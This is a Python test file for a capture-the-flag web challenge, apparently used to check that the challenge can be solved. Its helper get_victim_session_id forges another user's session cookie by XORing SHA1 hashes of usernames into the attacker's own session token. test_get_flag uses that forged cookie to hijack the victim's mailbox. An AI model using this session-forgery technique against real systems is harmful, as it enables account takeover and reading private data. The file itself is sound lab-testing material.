#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2016, Bright Pixel
#
# For these tests to work, remember to start the service.
#


from __future__ import print_function
from __future__ import division
from __future__ import unicode_literals
from __future__ import absolute_import


import unittest
import requests
import os
import sys

from hashlib import sha1

# Ensure the application source is reachable...
sys.path.insert(0, os.path.join(os.path.split(__file__)[0], "../app"))

# Allow importing application modules just for their constants...
from django.conf import settings
settings.configure()

from views import ATTACKER_USERNAME, ATTACKER_PASSWORD, \
                  VICTIM_USERNAME, SESSION_ID_COOKIE_NAME, EMAILS


APP_URL = "http://127.0.0.1:8753"


def string_xor(s1, s2):
    if len(s1) != len(s2):
        raise ValueError("mismatched lengths")

    r = []
    for c1, c2 in zip(s1, s2):
        r.append(chr(ord(c1) ^ ord(c2)))

    return b''.join(r)


def get_victim_session_id(victim, attacker_session_id):
    """Obtain the victim's session ID based on the attacker's session ID."""

    user, session = attacker_session_id.strip("\"").split(":")
    session = session.decode('hex')

    user_hash = sha1(user).digest()
    victim_hash = sha1(victim).digest()
    hash_xor = string_xor(user_hash, victim_hash)

    victim_session = string_xor(session, hash_xor).encode("hex")

    return b"%s:%s" % (victim, victim_session)


class TestApp(unittest.TestCase):
    def setUp(self):
        r = requests.get("%s/" % APP_URL)
        self.csrf_token = r.cookies["csrftoken"]


    def test_trigger_debug(self):
        """Ensure the fake debug page returns the necessary challenge hints."""

        r = requests.post("%s/login" % APP_URL,
                          cookies={"csrftoken": self.csrf_token},
                          data={"csrfmiddlewaretoken": self.csrf_token,
                                "username": "ã",  # ...any special character.
                                "password": "",
                                "submit": "Submit"})

        self.assertEqual(r.status_code, 200)
        self.assertTrue("stream_cipher" in r.text)
        self.assertTrue("/home/%s/" % VICTIM_USERNAME in r.text)


    def test_attacker_login(self):
        """Ensure the attacker can login successfully and read email."""

        with requests.Session() as s:
            r = s.post("%s/login" % APP_URL,
                       cookies={"csrftoken": self.csrf_token},
                       data={"csrfmiddlewaretoken": self.csrf_token,
                             "username": ATTACKER_USERNAME,
                             "password": ATTACKER_PASSWORD,
                             "submit": "Submit"})

            # The list of emails can be seen...
            self.assertEqual(r.status_code, 200)
            self.assertTrue(EMAILS[ATTACKER_USERNAME][0][0] in r.text)  # ...subject.

            # There's an email from the system administrator...
            r = s.get("%s/viewmail/1/" % APP_URL)
            self.assertEqual(r.status_code, 200)
            self.assertTrue(VICTIM_USERNAME in r.text.lower())


    def test_get_flag(self):
        """Ensure we can successfully get the challenge flag."""

        with requests.Session() as s:
            r = s.post("%s/login" % APP_URL,
                       cookies={"csrftoken": self.csrf_token},
                       data={"csrfmiddlewaretoken": self.csrf_token,
                             "username": ATTACKER_USERNAME,
                             "password": ATTACKER_PASSWORD,
                             "submit": "Submit"})

            # The list of *attacker* emails can be seen...
            self.assertEqual(r.status_code, 200)
            self.assertTrue(EMAILS[ATTACKER_USERNAME][0][0] in r.text)  # ...subject.

            # Get the victim's session...
            sid = next(c for c in s.cookies if c.name == SESSION_ID_COOKIE_NAME)
            victim_sid = get_victim_session_id(VICTIM_USERNAME, sid.value)
            s.cookies.set(sid.name, victim_sid, domain=sid.domain)

            # The flag is contained in the first email...
            r = s.get("%s/viewmail/1/" % APP_URL)
            self.assertEqual(r.status_code, 200)
            self.assertTrue("Your answer is " in r.text)


if __name__ == "__main__":
    unittest.main()


# vim: set expandtab ts=4 sw=4:
